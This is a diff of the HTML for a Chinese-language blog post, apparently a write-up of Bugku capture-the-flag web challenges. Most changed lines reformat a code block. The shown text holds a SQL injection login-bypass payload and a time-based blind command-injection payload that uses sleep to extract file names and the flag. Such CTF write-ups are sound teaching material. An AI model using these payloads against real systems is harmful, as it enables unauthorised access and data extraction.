@@ -173,7 +173,7 @@
 <meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/f77af8f172266d1fe439f7002061ea87.png">
 <meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/4508c753820543ff1aefdd2afde58c2d.png">
 <meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/c8cfcc1334c7ff1f2b25880100014ba3.png">
-<meta property="og:updated_time" content="2019-02-03T06:38:06.673Z">
+<meta property="og:updated_time" content="2019-02-03T06:41:57.190Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="bugku web wp">
 <meta name="twitter:description" content="这是半年前打的bugku的wp了，记录一下我的摸鱼之路 _(:з」∠)_">
@@ -585,7 +585,8 @@
 <p>这里是分离式的用户密码验证，绕开md5()是重点<br>于是构造payload:<br><code>username = admin&#39; union select md5(1),md5(1)#&amp;password=1</code><br>登录成功，进去是个命令执行页面</p>
 <p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/8262360a06dba00fd63d73a4b6e9c189.png" alt=""></p>
 <p>这里尝试过反弹shell但不知道为什么没成功于是换用盲注</p>
-<p>构造payload：<br><code>c=123;a=</code>ls<code>;b=&#39;a&#39;;if [ ${a:0:1} == $b ];then sleep 5;fi</code><br>把整个目录跑出来，得到fLag_c2Rmc2Fncn-MzRzZGZnNDc.txt<br>然后再构造payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=123;a=`fLag_c2Rmc2Fncn-MzRzZGZnNDc.txt\`;b=&apos;a&apos;;if [ $&#123;a:0:1&#125; == $b ];then sleep 5;fi</span><br></pre></td></tr></table></figure></p>
+<p>构造payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=123;a=`ls`;b=&apos;a&apos;;if [ $&#123;a:0:1&#125; == $b ];then sleep 5;fi</span><br></pre></td></tr></table></figure></p>
+<p>把整个目录跑出来，得到fLag_c2Rmc2Fncn-MzRzZGZnNDc.txt<br>然后再构造payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=123;a=`fLag_c2Rmc2Fncn-MzRzZGZnNDc.txt\`;b=&apos;a&apos;;if [ $&#123;a:0:1&#125; == $b ];then sleep 5;fi</span><br></pre></td></tr></table></figure></p>
 <p>跑出flag</p>
 <h2 id="login3-SKCTF"><a href="#login3-SKCTF" class="headerlink" title="login3(SKCTF)"></a>login3(SKCTF)</h2><p>这题进去后试了几下，发现有进行过滤<br>于是写个脚本跑一下过滤了什么</p>
 <p>发现空格 , union = and information被过滤 </p>
